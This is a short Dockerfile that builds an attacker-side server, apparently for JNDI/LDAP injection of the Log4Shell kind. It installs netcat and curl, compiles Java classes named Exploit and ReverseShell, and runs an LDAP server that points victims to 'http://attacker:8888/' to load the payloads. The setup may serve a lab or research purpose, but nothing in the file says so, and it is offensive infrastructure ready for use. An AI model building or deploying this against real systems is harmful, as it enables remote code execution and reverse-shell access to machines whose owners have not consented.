
FROM python:3.9-slim

WORKDIR /app
RUN apt-get update && apt-get install -y \
    openjdk-11-jdk-headless \
    netcat-openbsd \
    curl \
    && rm -rf /var/lib/apt/lists/*
COPY ldap_server.py .
COPY http_server.py .

COPY ../exploits/*.java ./payloads/
RUN cd payloads && \
    javac -source 8 -target 8 Exploit.java && \
    javac -source 8 -target 8 ReverseShell.java || true

EXPOSE 1389 8888

CMD ["python3", "ldap_server.py", "1389", "http://attacker:8888/"]
